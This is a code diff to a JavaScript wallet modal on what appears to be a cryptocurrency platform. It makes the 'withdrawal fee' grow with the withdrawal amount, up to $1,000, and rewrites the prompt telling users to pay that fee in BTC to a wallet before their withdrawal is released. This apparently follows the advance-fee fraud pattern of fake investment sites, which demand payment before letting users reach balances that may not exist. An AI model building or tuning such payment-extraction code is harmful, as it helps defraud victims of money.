@@ -52,25 +52,40 @@
     return fee != null && !Number.isNaN(Number(fee)) ? Number(fee) : 500;
   }
 
-  function formatFeeBtc() {
+  function getWithdrawalFeeForAmount(amount) {
+    var base = getWithdrawalFee();
+    var usd = Number(amount) || 0;
+    if (usd < 10000) return base;
+    var scaled = base + Math.min(500, Math.floor((usd - 10000) / 20));
+    return Math.min(1000, scaled);
+  }
+
+  function getActiveWithdrawalFee() {
+    return WalletModal._currentFee != null ? WalletModal._currentFee : getWithdrawalFee();
+  }
+
+  function formatFeeBtc(feeUsd) {
     var price = window.BtcPrice && typeof BtcPrice.getLivePrice === "function"
       ? BtcPrice.getLivePrice() : (window.BtcPrice && BtcPrice.price) || 0;
     if (!price) return "—";
-    return (getWithdrawalFee() / price).toFixed(6) + " BTC";
+    var fee = feeUsd != null ? feeUsd : getActiveWithdrawalFee();
+    return (fee / price).toFixed(6) + " BTC";
   }
 
   function updateFeeDisplay() {
     var feeEl = document.getElementById("wallet-modal-fee");
     if (!feeEl || feeEl.classList.contains("hidden")) return;
+    var fee = getActiveWithdrawalFee();
     var usdEl = document.getElementById("wallet-modal-fee-usd");
     var btcEl = document.getElementById("wallet-modal-fee-btc");
-    if (usdEl) usdEl.textContent = "$" + getWithdrawalFee().toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-    if (btcEl) btcEl.textContent = formatFeeBtc();
+    if (usdEl) usdEl.textContent = "$" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+    if (btcEl) btcEl.textContent = formatFeeBtc(fee);
   }
 
   window.WalletModal = {
     _onConfirm: null,
     _feeTimer: null,
+    _currentFee: null,
 
     open: function (opts) {
       ensureModal();
@@ -109,6 +124,7 @@
         WalletModal._feeTimer = null;
       }
       WalletModal._onConfirm = null;
+      WalletModal._currentFee = null;
     },
 
     showDeposit: function (amount, onConfirm) {
@@ -121,11 +137,12 @@
     },
 
     showWithdrawFee: function (amount, onConfirm) {
-      var fee = getWithdrawalFee();
+      var fee = getWithdrawalFeeForAmount(amount);
+      WalletModal._currentFee = fee;
       this.open({
         title: "Withdrawal Fee Required",
         showFee: true,
-        message: "Before your withdrawal of $" + Number(amount).toLocaleString() + " can be processed, pay the one-time withdrawal fee of $" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " to the BTC wallet below. Your withdrawal stays Pending for 10–20 minutes; your balance updates after fee verification.",
+        message: "Pay the withdrawal fee of $" + fee.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + " in BTC to the wallet below. Your $" + Number(amount).toLocaleString() + " withdrawal stays Pending until the fee is verified (10–20 minutes).",
         confirmLabel: "I've Paid the Fee",
         onConfirm: onConfirm
       });
